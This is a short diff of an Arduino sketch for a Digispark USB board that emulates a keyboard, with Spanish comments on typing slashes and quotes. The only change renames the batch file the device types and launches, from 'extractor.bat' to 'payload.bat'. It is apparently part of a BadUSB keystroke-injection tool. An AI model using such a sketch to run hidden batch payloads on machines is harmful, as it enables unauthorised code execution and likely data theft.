@@ -43,7 +43,7 @@ void loop() {
   // Imprimir la barra '/' -> Shift + 7
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
 
-  DigiKeyboard.print("extractor.bat start ");
+  DigiKeyboard.print("payload.bat start ");
 
   // Imprimir la barra '/' -> Shift + 7
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
@@ -56,7 +56,7 @@ void loop() {
   // Imprimir la barra '/' -> Shift + 7
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
 
-  DigiKeyboard.print("extractor.bat");
+  DigiKeyboard.print("payload.bat");
 
   // Imprimir comillas finales '"' -> Shift + 2
   DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 
